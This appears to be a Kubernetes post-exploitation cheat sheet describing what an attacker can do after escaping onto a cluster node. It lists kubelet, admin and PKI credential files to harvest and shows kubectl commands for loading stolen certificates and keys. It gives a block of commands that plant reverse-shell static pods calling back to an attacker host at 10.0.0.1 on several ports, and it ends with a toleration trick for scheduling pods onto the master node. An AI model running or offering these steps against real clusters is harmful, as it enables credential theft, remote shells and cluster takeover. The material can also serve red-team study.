### what can we do inside the node
0. **Master** node or **Worker** node? 
  
Since Kubernetes v1.20:
```bash 
kubectl get nodes -l 'node-role.kubernetes.io/control-plane'`
```
Before Kubernetes v1.20:
```bash
kubectl get nodes -l 'node-role.kubernetes.io/master'
```
To get workers we can use negation for above expressions (since Kubernetes v1.20):
```bash
kubectl get nodes -l '!node-role.kubernetes.io/control-plane'
```
Before Kubernetes v1.20:
```bash
kubectl get nodes -l '!node-role.kubernetes.io/master'
```
Another approach is to use command kubectl cluster-info which will print IP address of the control-plane:

Kubernetes control plane is running at **https://{ip-address-of-the-control-plane}:8443**

1. Full file system access: configs, keys, certs:
- `$HOME/.kube/config`
- `/etc/kubernetes/bootstrap-kubelet.conf`
- `/etc/kubernetes/manifests/etcd.yaml`
- `/etc/kubernetes/pki`

Use: 
- apply config for kubectl: 
```bash
kubectl –kubeconfig $HOME/.kube/config get po
```

- apply cert for kubectl: 
```bash
KUBECONFIG=<filename> kubectl config set-cluster default-cluster --server=https://<host_ip>:6443 --certificate-authority <path-to-kubernetes-ca> --embed-certs
```

- apply pem-key for kubectl: 
```bash
KUBECONFIG=<filename> kubectl config set-credentials <credential-name> --client-key <path-to-key>.pem --client-certificate <path-to-cert>.pem --embed-certs
```

- set current cluster context: 
```bash
KUBECONFIG=<filename> kubectl config set-context default-system --cluster default-cluster --user <credential-name>
```

- use cluster context:
```bash 
KUBECONFIG=<filename> kubectl config use-context default-system
```

2. Container runtime socket (conn to sock and exec)
- [crictl](https://github.com/kubernetes-sigs/critools) (provides a CLI for CRI-compatible container runtimes. This allows the CRI runtime developers to debug their runtime without needing to set up Kubernetes components)
```bash
curl -sL https://github.com/kubernetes-sigs/critools/releases/download/v1.25.0/crictl-v1.25.0-linux-amd64.tar.gz | tar zxf -
```
- usage: `crictl exec -i -t example_pod bash`, `crictl ps` (get images), `crictl logs <image_id>` (get logs) ... 

- crictl by default connects on Unix to:
  - unix:///run/containerd/containerd.sock or
  - unix:///run/crio/crio.sock or
  - unix:///var/run/cri-dockerd.sock
- or on Windows to:
  - npipe:////./pipe/containerd-containerd or
  - npipe:////./pipe/cri-dockerd

1. Using these configs, you can interact with Pod and other resources located on the Node to which you fled
```bash
kubectl –kubeconfig /etc/kubernetes/kubelet.conf get po -A
```

**Useful ways**:
- `/var/lib/kubelet/kubeconfig`
- `/var/lib/kubelet/kubelet.conf`
- `/var/lib/kubelet/config.yaml`
- `/var/lib/kubelet/kubeadm-flags.env`
- `/etc/kubernetes/kubelet-kubeconfig`
- `/etc/kubernetes/kubelet.conf`
- `/etc/kubernetes/admin.conf`
- `/etc/kubernetes/controller-manager.conf`
- `/etc/kubernetes/scheduler.conf`

4. We can create StaticPod (for example, try create pods with reverseshell from https://github.com/BishopFox/badPods)
```bash
HOST="10.0.0.1" PORT="3111" envsubst < ./manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml >> /etc/kubernetes/manifests/everything-allowed-revshell-pod.yaml
HOST="10.0.0.1" PORT="3112" envsubst < ./manifests/priv-and-hostpid/pod/priv-and-hostpid-revshell-pod.yaml >> /etc/kubernetes/manifests/priv-and-hostpid-revshell-pod.yaml
HOST="10.0.0.1" PORT="3113" envsubst < ./manifests/priv/pod/priv-revshell-pod.yaml >> /etc/kubernetes/manifests/priv-revshell-pod.yaml
HOST="10.0.0.1" PORT="3114" envsubst < ./manifests/hostpath/pod/hostpath-revshell-pod.yaml >> /etc/kubernetes/manifests/hostpath-revshell-pod.yaml
HOST="10.0.0.1" PORT="3115" envsubst < ./manifests/hostpid/pod/hostpid-revshell-pod.yaml  >> /etc/kubernetes/manifests/hostpid-revshell-pod.yaml 
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/hostnetwork/pod/hostnetwork-revshell-pod.yaml >> /etc/kubernetes/manifests/hostnetwork-revshell-pod.yaml
HOST="10.0.0.1" PORT="3117" envsubst < ./manifests/hostipc/pod/hostipc-revshell-pod.yaml >> /etc/kubernetes/manifests/hostipc-revshell-pod.yaml
HOST="10.0.0.1" PORT="3118" envsubst < ./manifests/nothing-allowed/pod/nothing-allowed-revshell-pod.yaml >> /etc/kubernetes/manifests/nothing-allowed-revshell-pod.yaml
```

5. Road to the Master Node
Most clusters cannot run containers on the Master Node
- the Master Node stores the Service Account, keys and certificates, thanks to which we can become a cluster-admin
Kubernetes has a Taints & Toleraitions mechanism that prevents running a Pod on the Master Node. **Bypass**:
```yaml
spec:
    tolerations:
    - key: ""
      operator: "Exists"
      effect: "NoSchedule"
```
